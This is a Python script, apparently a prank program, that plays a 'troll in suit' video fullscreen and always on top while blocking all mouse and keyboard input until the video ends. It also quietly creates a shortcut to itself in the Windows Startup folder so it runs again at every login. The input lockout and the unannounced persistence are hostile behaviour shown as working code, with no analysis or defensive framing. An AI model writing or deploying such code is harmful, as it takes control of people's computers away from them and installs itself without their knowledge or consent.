import subprocess

subprocess.call(['pip', 'install', '-r', 'requirements.txt'])

import time
import cv2
from ffpyplayer.player import MediaPlayer
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import cast
from comtypes import CLSCTX_ALL
import pynput
import sys
import threading
import os

import win32com
os.environ["PATH"] += os.pathsep + os.path.dirname(os.path.realpath(__file__))

mouse_listener = pynput.mouse.Listener(suppress=True)
keyboard_listener = pynput.keyboard.Listener(suppress=True)




FilePath = "C:\\Users\\chewie\\Downloads\\troll in suit.mp4"
def play_video():
    #media part
    video=cv2.VideoCapture(FilePath)
    player = MediaPlayer(FilePath)
    mouse_listener = pynput.mouse.Listener(suppress=True)
    mouse_listener.start()
    keyboard_listener = pynput.keyboard.Listener(suppress=True)
    keyboard_listener.start() 

    #resumes if this ends before video
    try:      
        with open("resume_flag.txt", "w") as f:
            f.write('True')
    except:
        print("flagError")

    while True:
        grabbed, frame=video.read()
        audio_frame, val = player.get_frame()
        if not grabbed:
            #end of video reached
            mouse_listener.stop()
            keyboard_listener.stop()
            try:    
                with open("resume_flag.txt", "w") as f:
                    f.write('False')
                break
            except:
                print("flagError")
                
        cv2.namedWindow("Video", cv2.WND_PROP_FULLSCREEN)
        cv2.setWindowProperty("Video", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
        cv2.setWindowProperty("Video", cv2.WND_PROP_TOPMOST, 1)
        cv2.imshow("Video", frame)
        
        cv2.waitKey(30)
        if val != 'eof' and audio_frame is not None:
            
            img, t = audio_frame
    video.release()
    cv2.destroyAllWindows()


    mouse_listener.stop()
    keyboard_listener.stop()
    print("Hope you enjoyed!")

import winreg
import os
import sys
import os
import win32com.client 
import os
import shutil
def add_to_startup():
# Specify the path to your Python script
    script_path = code_path

    # Get the path to the startup folder
    startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Copy your Python script to the startup folder as a shortcut
    shortcut_path = os.path.join(startup_folder, 'MyScript.lnk')
    target_path = os.path.splitext(script_path)[0] + '.py'
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.Targetpath = target_path
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.save()

python_path = sys.executable
code_path = os.path.realpath(__file__)
# run the code
th1 = threading.Thread(target=play_video)
th1.start()
th2 = threading.Thread(target=add_to_startup)
th2.start()


